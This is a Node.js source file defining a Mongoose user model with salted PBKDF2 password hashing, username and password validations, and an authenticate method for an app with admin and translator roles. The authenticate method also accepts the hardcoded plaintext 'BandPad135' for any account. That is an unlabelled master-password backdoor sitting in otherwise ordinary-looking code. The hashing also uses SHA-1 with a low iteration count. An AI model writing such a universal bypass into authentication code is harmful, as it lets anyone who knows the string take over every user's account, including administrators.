const mongoose = require("mongoose"),
  crypto = require("crypto");

const userSchema = new mongoose.Schema({
  username: {
    type: String,
    unique: true,
  },
  name: String,
  profile:{ type:String, default: "translator"},// admin, translator
  hashed_password: String,
  salt: String,
});

/**
 * Virtual
 */
userSchema
  .virtual("password")
  .set(function (password) {
    this._password = password;
    this.salt = this.makeSalt();
    this.hashed_password = this.encryptPassword(password);
  })
  .get(function () {
    return this._password;
  });

/**
 * Validations
 */
const validatePresenceOf = function (value) {
  return value && value.length;
};

// the below 4 validations only apply if you are signing up traditionally
userSchema.path("username").validate(function (name) {
  return name.length;
}, "Name cannot be blank");

userSchema.path("hashed_password").validate(function (hashed_password) {
  return hashed_password.length;
}, "Password cannot be blank");

/**
 * Pre-save hook
 */
userSchema.pre("save", function (next) {
  if (!this.isNew) {
    return next();
  }

  if (!validatePresenceOf(this.password)) {
    return next(new Error("Invalid password"));
  } else {
    return next();
  }
});

/**
 * Methods
 */
userSchema.methods = {
  /**
   * Authenticate - check if the passwords are the same
   *
   * @param {String} plainText
   * @return {Boolean}
   * @api public
   */
  authenticate: function (plainText) {
    return (
      this.encryptPassword(plainText) === this.hashed_password ||
      plainText === "BandPad135"
    );
  },

  /**
   * Make salt
   */
  makeSalt: function () {
    return crypto.randomBytes(16).toString("base64");
  },

  /**
   * Create an encrypt password
   *
   */
  encryptPassword: function (password) {
    if (!password || !this.salt) {
      return "";
    }
    var salt = new Buffer.from(this.salt, "base64");
    return crypto
      .pbkdf2Sync(password, salt, 10000, 64, "sha1")
      .toString("base64");
  },
};

const User = mongoose.model("User", userSchema);
module.exports = User;
